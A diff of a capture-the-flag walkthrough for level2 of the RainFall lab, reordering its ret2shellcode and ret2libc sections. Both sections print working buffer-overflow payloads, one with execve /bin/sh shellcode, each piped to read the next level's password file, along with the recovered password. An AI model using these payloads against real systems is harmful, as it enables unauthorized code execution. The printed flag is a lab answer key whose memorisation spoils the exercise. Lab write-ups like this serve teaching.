@@ -69,39 +69,6 @@ Anything written beyond those 80 bytes will be treated as an address (only the 4
 
 There's different ways to solve this challenge, we'll see two of them. First with a ret2shellcode and then the ret2libc way.
 
-### Ret2Shellcode
-Check the [level1's walkthrough](../level1/walkthrough.md#ret2shellcode) for an explanation of the ret2shellcode technique.
-
-To redirect the execution, after the buffer overflow, we need an address. We use `ltrace` to find that `strdup` returns to `0x0804a008`.
-
-```bash
-level2@RainFall:~$ ltrace ./level2
-[...]
-strdup("") = 0x0804a008
-```
-
-Since `strdup` allocates the buffer that was read by `gets`, the address of the shellcode will be stored at `0x0804a008` (The address that was returned by strdup).
-
-So our payload will be:
-```
-shellcode + padding + address of shellcode
-Alternatively, you could place the padding before the shellcode, using NOPs.
-
-"\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80" + "\x90"*(80-21) + "\x08\x04\xa0\x08"[::-1]
-```
-
-The padding is 80 - 21 because the shellcode is 21 bytes long.
-
-Alright let's try it:
-```bash
-level2@RainFall:~$ (python -c 'print("\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80" + "\x90"*(80-21) + "\x08\x04\xa0\x08"[::-1])' && echo 'cat /home/user/level3/.pass') | ./level2
-j
- X�Rh//shh/bin��1�̀������������������������������������������������������
-492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02
-```
-
-Perfect, let's move to the other solution.
-
 ### Ret2Libc
 Check the [level1's walkthrough](../level1/walkthrough.md#ret2libc) for an explanation of the ret2libc technique.
 
@@ -153,6 +120,41 @@ Let's run it:
 ```bash
 level2@RainFall:~$ (python -c 'print("\x90"*80 + "\x08\x04\x85\x3e"[::-1] + "\xb7\xe6\xb0\x60"[::-1] + "\x08\x04\x83\xd0"[::-1] + "\xb7\xf8\xcc\x58"[::-1])' && echo 'cat /home/user/level3/.pass') | ./level2
 ����������������������������������������������������������������>������������>`��X���
+492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02
+```
+
+Perfect, let's move to the other solution.
+
+### Ret2Shellcode
+Check the [level1's walkthrough](../level1/walkthrough.md#ret2shellcode) for an explanation of the ret2shellcode technique.
+
+We can either feed our shellcode to the program, or we can put the shellcode in an environment variable. For convenience, we'll feed our shellcode to the program.
+> The reason why we're not using an environment variable is because the address of the environment variable will start with `0xb` which will trigger the check in the source code. We could use the same technique as the ret2libc solution, by adding the address of a `ret` instruction, but it's easier to just feed the shellcode to the program.
+
+We use `ltrace` to find the address of our shellcode:
+```bash
+level2@RainFall:~$ ltrace ./level2
+[...]
+strdup("") = 0x0804a008
+```
+
+Since `strdup` allocates the buffer that was read by `gets`, the address of the shellcode will be stored at `0x0804a008` (The address that was returned by strdup).
+
+So our payload will be:
+```
+shellcode + padding + address of shellcode
+Alternatively, you could place the padding before the shellcode, using NOPs.
+
+"\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80" + "\x90"*(80-21) + "\x08\x04\xa0\x08"[::-1]
+```
+
+The padding is 80 - 21 because the shellcode is 21 bytes long.
+
+Alright let's try it:
+```bash
+level2@RainFall:~$ (python -c 'print("\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80" + "\x90"*(80-21) + "\x08\x04\xa0\x08"[::-1])' && echo 'cat /home/user/level3/.pass') | ./level2
+j
+ X�Rh//shh/bin��1�̀������������������������������������������������������
 492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02
 ```
 
